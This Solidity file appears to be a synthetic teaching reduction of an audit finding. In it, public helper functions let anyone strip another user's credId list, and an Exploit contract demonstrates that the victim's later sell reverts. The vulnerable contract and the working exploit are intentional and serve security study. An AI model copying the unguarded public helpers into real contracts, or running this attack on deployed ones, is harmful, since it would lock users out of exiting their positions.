// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi — Exposed _removeCredIdPerAddress / _addCredIdPerAddress
    (Code4rena 2024-08-phi, finding #41091, H-05, reporter unnamed)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Cred._addCredIdPerAddress and Cred._removeCredIdPerAddress are PUBLIC
    (underscore prefix only — no access control). Anyone can mutate any user's
    _credIdsPerAddress list / index map. A victim who legitimately holds a
    credId can have it stripped from their list; the subsequent sell path that
    calls _removeCredIdPerAddress then reverts (EmptyArray / IndexOutofBounds /
    WrongCredId), freezing their ability to cleanly exit that cred.

    Harm: victim's legitimate sell/remove of their held cred permanently reverts
    after the attacker strips the entry — liveness DoS on share exit.
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced Cred — public add/remove of per-address credId lists.
contract Cred {
    mapping(address => uint256[]) private _credIdsPerAddress;
    mapping(address => uint256) private _credIdsPerAddressArrLength;
    mapping(address => mapping(uint256 => uint256)) private _credIdsPerAddressCredIdIndex;
    // Share balances (simplified) so a "sell" path has something to gate on.
    mapping(address => mapping(uint256 => uint256)) public shares;

    error EmptyArray();
    error IndexOutofBounds();
    error WrongCredId();
    error NoShares();

    /// @dev Legitimate buy: records shares and registers the credId for the buyer.
    function buyShareCred(uint256 credId_, uint256 amount_) external {
        if (shares[msg.sender][credId_] == 0) {
            _addCredIdPerAddress(credId_, msg.sender);
        }
        shares[msg.sender][credId_] += amount_;
    }

    /// @dev Legitimate full sell: removes the credId from the per-address list.
    function sellShareCred(uint256 credId_, uint256 amount_) external {
        uint256 bal = shares[msg.sender][credId_];
        if (bal < amount_) revert NoShares();
        shares[msg.sender][credId_] = bal - amount_;
        if (shares[msg.sender][credId_] == 0) {
            // Real Cred always calls remove on a full sell — if the public
            // remove was already abused, this reverts and the exit is bricked.
            _removeCredIdPerAddress(credId_, msg.sender);
        }
    }

    // Function to add a new credId to the address's list
    function _addCredIdPerAddress(uint256 credId_, address sender_) public {
        // Add the new credId to the array
        _credIdsPerAddress[sender_].push(credId_);
        // Store the index of the new credId
        _credIdsPerAddressCredIdIndex[sender_][credId_] = _credIdsPerAddressArrLength[sender_];
        // Increment the array length counter
        _credIdsPerAddressArrLength[sender_]++;
    }

    // Function to remove a credId from the address's list
    function _removeCredIdPerAddress(uint256 credId_, address sender_) public {
        // Check if the array is empty
        if (_credIdsPerAddress[sender_].length == 0) revert EmptyArray();

        // Get the index of the credId to remove
        uint256 indexToRemove = _credIdsPerAddressCredIdIndex[sender_][credId_];
        // Check if the index is valid
        if (indexToRemove >= _credIdsPerAddress[sender_].length) revert IndexOutofBounds();

        // Verify that the credId at the index matches the one we want to remove
        uint256 credIdToRemove = _credIdsPerAddress[sender_][indexToRemove];
        // @> VULN: these helpers are PUBLIC — any caller can pass an arbitrary
        // sender_ and strip / reorder that user's credId list, desyncing the
        // index map so a later legitimate remove reverts WrongCredId/bounds.
        // FIX: make both functions internal (only callable from buy/sell paths).
        if (credId_ != credIdToRemove) revert WrongCredId();

        // Get the last element in the array
        uint256 lastIndex = _credIdsPerAddress[sender_].length - 1;
        uint256 lastCredId = _credIdsPerAddress[sender_][lastIndex];
        // Move the last element to the position of the element we're removing
        _credIdsPerAddress[sender_][indexToRemove] = lastCredId;

        // Update the index of the moved element, if it's not the one we're removing
        if (indexToRemove < lastIndex) {
            _credIdsPerAddressCredIdIndex[sender_][lastCredId] = indexToRemove;
        }

        // Remove the last element (which is now a duplicate)
        _credIdsPerAddress[sender_].pop();

        // Remove the index mapping for the removed credId
        delete _credIdsPerAddressCredIdIndex[sender_][credIdToRemove];

        // Decrement the array length counter, if it's greater than 0
        if (_credIdsPerAddressArrLength[sender_] > 0) {
            _credIdsPerAddressArrLength[sender_]--;
        }
    }

    function credCount(address user) external view returns (uint256) {
        return _credIdsPerAddress[user].length;
    }

    function credAt(address user, uint256 i) external view returns (uint256) {
        return _credIdsPerAddress[user][i];
    }
}

/// @dev Distinct victim address so the attacker can target sender_=victim.
contract Victim {
    Cred public cred;
    uint256 public constant CRED_ID = 1;

    constructor(Cred cred_) {
        cred = cred_;
    }

    function buy() external {
        cred.buyShareCred(CRED_ID, 10);
    }

    function sellAll() external {
        uint256 bal = cred.shares(address(this), CRED_ID);
        cred.sellShareCred(CRED_ID, bal);
    }
}

contract Exploit {
    Cred public cred; // CREATE nonce 1
    Victim public victim; // CREATE nonce 2

    uint256 public constant CRED_ID = 1;

    constructor() {
        cred = new Cred();
        victim = new Victim(cred);
        // Victim legitimately buys shares of cred 1 (registers the credId).
        victim.buy();
    }

    function run() external {
        require(cred.credCount(address(victim)) == 1, "victim not registered");
        require(cred.shares(address(victim), CRED_ID) == 10, "victim has no shares");

        // === attack: anyone can strip the victim's credId from their list ===
        cred._removeCredIdPerAddress(CRED_ID, address(victim));

        require(cred.credCount(address(victim)) == 0, "list not stripped");
        // Shares are STILL there — only the bookkeeping list was corrupted.
        require(cred.shares(address(victim), CRED_ID) == 10, "shares should remain");

        // Legitimate full sell now reverts: remove runs against an empty/desynced list.
        bool sellReverted;
        try victim.sellAll() {
            sellReverted = false;
        } catch {
            sellReverted = true;
        }
        require(sellReverted, "victim sell should be bricked");

        // HARM: victim still holds shares but cannot exit via the normal sell path.
        require(cred.shares(address(victim), CRED_ID) == 10, "shares frozen on victim");
    }
}
